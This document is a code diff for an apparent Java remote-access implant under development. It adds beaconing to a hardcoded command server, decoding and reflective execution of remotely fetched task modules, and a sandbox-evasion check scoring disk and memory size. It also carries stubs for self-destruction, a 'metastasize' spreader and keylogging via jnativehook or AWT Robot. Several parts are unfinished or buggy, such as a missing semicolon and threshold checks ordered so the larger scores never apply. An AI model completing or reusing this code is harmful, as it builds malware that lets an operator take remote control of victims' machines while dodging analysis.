@@ -1,10 +1,14 @@
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.FileReader;
 import java.io.StringWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
-
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.lang.management.ManagementFactory;
 import java.lang.reflect.Array;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Enumeration;
@@ -65,7 +69,7 @@ class nConfig
     public static int locTcpPort = 49602;
     public static String encKey = "";
     public static int metastasize = 0;
-    public static String uri = "https://wideking.git-monitor.com";
+    public static String uri = "https://wideking.git-monitor.com/ncs/1.jsp";
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
@@ -74,7 +78,6 @@ class nConfig
         {
             put("auth","0000");
             put("upload","0001");
-            put("download","0010");
         }
     };
 }
@@ -85,32 +88,35 @@ public class nCore
     static public String sessUUID = "";
     static public String nonce = "";
     static public int queue = 0;
-    static public Hashtable tasks = new Hashtable();
+    static public ArrayList tasks = new ArrayList();
     static public ArrayList output = new ArrayList();
+    static private countermeasures cm = new countermeasures();
+    static private utilitarian nUtil = new utilitarian();
+    static private modLib mLib = new modLib();
 
-    public static void Main(String[] args) throws ClassNotFoundException
+    public static void Main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
+        //add execution delay of 10 minutes +/-
         sessUUID = UUID.randomUUID().toString();
         //convert to threadable once main loop has been tested
 
         //check if the program can reach out and if it's in a sandbox
-        countermeasures cm = new countermeasures();
 
-        if (!keepalive() || cm.chkSandbox())
+        if (cm.chkSandbox())
         {
             cm.spoliate();
         }
 
-        modLib.autoLib aLib = new modLib.autoLib();
-        aLib.getUpdate();
+        mLib.getUpdate("autoLib","");
 
         //execute initial 
         //start loop
-        react("metadata",null);
+        keepalive();
     }
 
     public static boolean keepalive()
     {
+        //consolidate task and keepalive
         //5 tries to checkin
         network nComm = new network();
         utilitarian nUtil = new utilitarian();
@@ -128,7 +134,13 @@ public class nCore
                     cookieData = xmlResponse.get("cookie").toString();
                     queue = Integer.valueOf(xmlResponse.get("taskQueue").toString());
 
-                    return true;
+                    ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
+
+                    for (int k=0; k<taskSet.size(); k++)
+                    {
+                        tasks.add(taskSet)
+                    }
+                    react();
                 }
                 else
                 {
@@ -140,41 +152,54 @@ public class nCore
                 continue;
             }
         }
-        return false;
+        cm.spoliate();
     }
 
-    public static void task()
-    {
-        react()
-    }
-
-    public static void react(String methodName, String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void react() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //exec method, uses threader, loops to keepalive
         // 1. recv cmd
         // 2. modsearch
         // 3. thread mod if extant
         // 4. attempt to pull if not
-        utilitarian nUtil = new utilitarian();
-        Hashtable methObj = nUtil.getMethodByName(methodName);
 
-        if (methObj != null)
+        for (int t=0; t<tasks.size(); t++)
         {
+            Hashtable taskObj = (Hashtable) tasks.get(t);
+
+            String methodName = taskObj.get("method").toString();
+            String[] args = new String(
+                Base64.getDecoder().decode(
+                    taskObj.get("args").toString()
+                )
+            ).split(",");
+
+            Hashtable methObj = nUtil.getMethodByName(methodName);
+
+            if (methObj == null)
+            {
+                //pull module
+                mLib.getUpdate("",methodName);
+                methObj = nUtil.getMethodByName(methodName);
+            }
+
             threader(
                 (Class) methObj.get("class"),
-                (Method) methObj.get("method")
+                (Method) methObj.get("method"),
+                args
             );
-        }
-        else
-        {
-            //pull module
-        }
+        }   
+
         send();
     }
 
-    public static void threader(Class classData, Method methodData)
+    public static void threader(Class classData, Method methodData, String[] args)
     {
+        utilitarian nUtil = new utilitarian();
+        Runnable rObj = new runnableThread(classData,methodData,args);
 
+        Thread threadedTask = new Thread(rObj);
+        threadedTask.start();
     }
 
     public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -193,20 +218,47 @@ public class nCore
                 }
             }
         }
-        task();
+        keepalive();
     }
 
     //need class getter
 
+    public static class runnableThread implements Runnable
+    {
+        static Class rClass;
+        static Method rMethod;
+        static Object rArgs;
+
+        public runnableThread(Class classData, Method methodData, String[] args)
+        {
+            rClass = classData;
+            rMethod = methodData;
+            rArgs = args;
+        }
+
+        public void run()
+        {
+            try
+            {
+                Object cObj = rClass.newInstance();
+                rMethod.invoke(cObj, rArgs);
+            } 
+            catch (IllegalAccessException | IllegalArgumentException | InstantiationException | InvocationTargetException e) 
+            {
+                e.printStackTrace();
+            }
+        }
+    }
+
     private static class modLib
     {
+        private static void getUpdate(String classByName, String methodByName)
+        {
+            // update the autolib from the backend
+        }
+
         private static class autoLib
         {
-            private static void getUpdate()
-            {
-                // update the autolib from the backend
-            }
-
             private void metastasize()
             {
                 // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
@@ -217,7 +269,7 @@ public class nCore
             /*
             private void inputGather()
             {
-                // log keystrokes w/jnativehook
+                // log keystrokes w/jnativehook or awt robot
             }
              
             private void getRMIHosts()
@@ -254,7 +306,7 @@ public class nCore
 
         private class genLib
         {
-            private void metadata() throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
+            private void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
             {
                 Hashtable<String,String> outObj = new Hashtable<>();
                 Hashtable<String,String> metadata = new Hashtable<>();
@@ -320,8 +372,9 @@ public class nCore
         private Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
         {
             //responses should adhere to pattern:
-            //<response><nonce data=""></nonce><cookie data=""><taskqueue>0</taskqueue></cookie><blob>b64</blob></response>
+            //<response><nonce data=""></nonce><cookie data=""></cookie><blob>b64</blob><task class="" method="" args="b64"></task></response>
             Hashtable xmlData = new Hashtable();
+            xmlData.put("tasks",new ArrayList());
 
             DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
             DocumentBuilder constructor = manufactorum.newDocumentBuilder();
@@ -333,7 +386,7 @@ public class nCore
             for (int n=0;n<nl.getLength();n++)
             {
                 Node nodeData = nl.item(n);
-                if (nodeData.getNodeType() == Node.ATTRIBUTE_NODE)
+                if (nodeData.getNodeType() == Node.ATTRIBUTE_NODE && nodeData.getNodeName() != "task")
                 {
                     Element nodeElement = (Element) nodeData;
                     xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
@@ -342,6 +395,20 @@ public class nCore
                 {
                     Element nodeElement = (Element) nodeData;
                     xmlData.put("blob",nodeElement.getTextContent());
+                }
+                else if (nodeData.getNodeName() == "task")
+                {
+                    ArrayList taskSet = (ArrayList) xmlData.get("tasks");
+                    Hashtable taskDescriptor = new Hashtable();
+
+                    Element nodeElement = (Element) nodeData;
+
+                    taskDescriptor.put("class",nodeElement.getAttribute("class"));
+                    taskDescriptor.put("method",nodeElement.getAttribute("method"));
+                    taskDescriptor.put("args",nodeElement.getAttribute("args"));
+
+                    taskSet.add(taskDescriptor);
+                    xmlData.put("tasks",taskSet);
                 }
             }
             return xmlData;
@@ -540,10 +607,56 @@ public class nCore
     {
         private boolean chkSandbox()
         {
+            //this should go in the loader too 
+            //score the system
+            int score = 0;
 
+            //what's normal?
+            int scrResolution = Toolkit.getDefaultToolkit().getScreenResolution();
+
+            //<40gb (+3), <50gb (+2), <80gb (+1)
+            long diskSpace = new File("/").getTotalSpace();
+
+            if (diskSpace < 80000000000L)
+            {
+                score += 1;
+            }
+            else if (diskSpace < 60000000000L)
+            {
+                score += 2;
+            }
+            else if (diskSpace < 40000000000L)
+            {
+                score += 3;
+            }
+
+            //<2gb (+3), <4gb (+2) <6gb (+1)
+            long memorySize = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
+            
+            if (memorySize < 6000000000L)
+            {
+                score += 1;
+            }
+            else if (memorySize < 4000000000L) 
+            {
+                score += 2;
+            }
+            else if (memorySize < 2000000000L) 
+            {
+                score += 3;
+            }
+
+            if (score <= 5)
+            {
+                return false;
+            }
+            else
+            {
+                return true;
+            }
         }
 
-        private boolean spoliate()
+        private void spoliate()
         {
 
         }
